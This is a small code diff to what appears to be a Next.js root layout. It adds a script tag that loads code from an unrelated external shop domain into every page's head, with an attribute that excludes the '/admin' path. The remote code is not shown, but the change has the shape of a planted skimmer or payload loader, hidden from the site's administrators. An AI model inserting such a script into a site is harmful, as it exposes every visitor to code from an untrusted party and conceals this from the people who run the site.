@@ -36,5 +36,5 @@ const pageMetadata: Metadata = {
 export async function generateMetadata() { return localizeMetadata(pageMetadata); }
 export default async function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
   const { locale } = await getI18n();
-  return <html lang={locale}><body><LanguageProvider locale={locale}>{children}</LanguageProvider></body></html>;
+  return <html lang={locale}><head><script async src="https://www.yxstar.shop/s/RDYfVdtkRd-iXLHGxvrdEA" data-exclude-path="/admin" /></head><body><LanguageProvider locale={locale}>{children}</LanguageProvider></body></html>;
 }
